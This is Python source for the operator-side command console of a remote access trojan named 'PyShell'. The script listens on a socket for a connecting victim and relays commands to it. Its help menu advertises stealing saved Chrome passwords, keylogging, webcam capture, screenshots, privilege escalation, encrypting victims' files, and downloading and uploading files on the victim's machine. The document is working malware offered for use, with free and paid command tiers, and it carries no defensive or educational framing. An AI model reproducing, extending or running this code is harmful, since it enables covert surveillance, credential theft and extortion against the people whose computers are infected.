import os
import socket
import sys
global help_menu
help_menu = """
┌[HELP MENU]────────────────────────────────────────────┐
│ INFO: All cmd terminal commands are available with    │
│       PyShell Free Version!                           │
│                                                       │
├[Free commands]────────────────────────────────────────┤
│ tasks      - displays all current running processes   │
│             on victims machine                        │
│             [usage]: tasks                            │
│                                                       │        
│ lock       - locks victims screen (like your putting  │
│             the pc to sleep)                          │
│             [usage]: lock                             │         
│                                                       │
│ msg        - displays a message box for 30 seconds    │
│              on victims screen. Note: commands are    │
│              unavailable until msg box has timed out  │
│              or closed                                │
│              [usage]: msg (your sentence here)        │
│                                                       │
│ ip         - gets victims ip                          │
│             [usage] ip                                │
│                                                       │            
│ download   - downloads a file from victims machine    │
│             [usage]: download (filename)              │
│                                                       │
│ upload     - uploads a file to victims machine in cwd │
│              Note: the file you want to upload must   │
│              be in 'C:/Py-Shell-Files'                │
│              [usage]: upload (filename)               │
│                                                       │
│ terminate  - terminates the connection                │
│             [usage]: terminate                        │
│                                                       │
├[Paid commands]────────────────────────────────────────┤
│ password   - steal all the victims saved passwords    │
│             on google chrome                          │            
│             [usage]: password                         │
│                                                       │
│ admin      - Attempt a privilege escalation exploit   │
│             [usage]: admin                            │
│                                                       │
│ webcam     - Take a picture with the users webcam     │
│             [usage]: webcam                           │
│                                                       │
│ screenshot - Take a screenshot of victims screen      │
│             [usage]: screenshot                       │
│                                                       │
│ keylogger  - save what the victim types to your own   │
│             output file                               │
│             [usage]: keylogger (file)                 │
│                                                       │
│ encrypt    - encrypt a victims file with AES 256 bit  │               
│              encryption                               │
│             [usage]: encrypt (file) (password)        │
│                                                       │
│ move       - moves the payload file to another        │
│              directory                                │
│             [usage]: move (directory)                 │
│                                                       │     
├[EXAMPLES]─────────────────────────────────────────────┤
│ > msg you have been pwned                             │
│ > encrypt secret.txt secretpassword                   │
│ > webcam                                              │
└───────────────────────────────────────────────────────┘          
"""


def create():
    global ip
    global server
    global conn
    global addr
    global serv_add
    global port
    while True:
        try:
            bind_ip = input("Enter ip address: ")
            bind_port = int(input("Enter port number: "))
            break
        except Exception as e:
            print("An error has occurred: "+str(e))
    serv_add = ((bind_ip , bind_port))
    #3
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((serv_add))
    server.listen(5)
    print ("[*] listening on {}:{}".format(bind_ip,bind_port))
    #4
    conn,addr = server.accept()
    print("[!] TARGET CONNECTED: {}:{}".format(addr[0],addr[1]))
    print("[*] Type 'help' for commands\n>")
    #5
    send_commands(conn)
    conn.close()



#1
def send_commands(conn):
    commands = ["help","tasks","lock","msg","ip","password","terminate"]
    try:
        os.chdir("C:/Py-Shell-Files")
    except FileNotFoundError:
        os.chdir("C:/")
        os.mkdir("/Py-Shell-Files")
        os.chdir("C:/Py-Shell-Files")

    while True:
        term = False
        cmd = input()
        if cmd == "terminate":
            term = True

        if cmd == "help":
            print(help_menu)
            print("> ", end="")

        elif len(str.encode(cmd)) > 0:
            if cmd[:6] == "upload":
                fname = cmd.replace("upload ","")
                try:
                    f = open(fname, "rb")
                    file = f.read()
                    conn.send(file)
                    client_response = str(conn.recv(16777216), "utf-8")
                    if client_response == "y":
                        conn.send(str.encode(fname))

                except FileNotFoundError:
                    print("[!] File not found \n>",end="")
                    conn.send(str.encode(cmd))

            else:
                conn.send(str.encode(cmd))

            if term == True:
                conn.close()
                server.close()
                wait = input("[!] Connection with {}:{} terminated ...".format(addr[0],addr[1]))
                exit()


            if cmd[:8] == "download":
                fname = cmd.replace("download ","")
                client_response = conn.recv(16777216)
                f = open(fname, "wb")
                f.write(client_response)
                f.close()
                try:
                    f = open(fname, "r")
                    text = f.read()
                except UnicodeDecodeError:
                    text = ""
                    pass
                if text[:3] == "[!]":
                    print("[!] File not found ",end="")
                    try:
                        os.unlink(fname)
                    except:
                        pass
                else:
                    print(f"[*] Saved file {fname} to "+str(os.getcwd()) + "\n> ", end="")

            else:
                client_response = str(conn.recv(16777216), "utf-8")
                print(client_response, end="")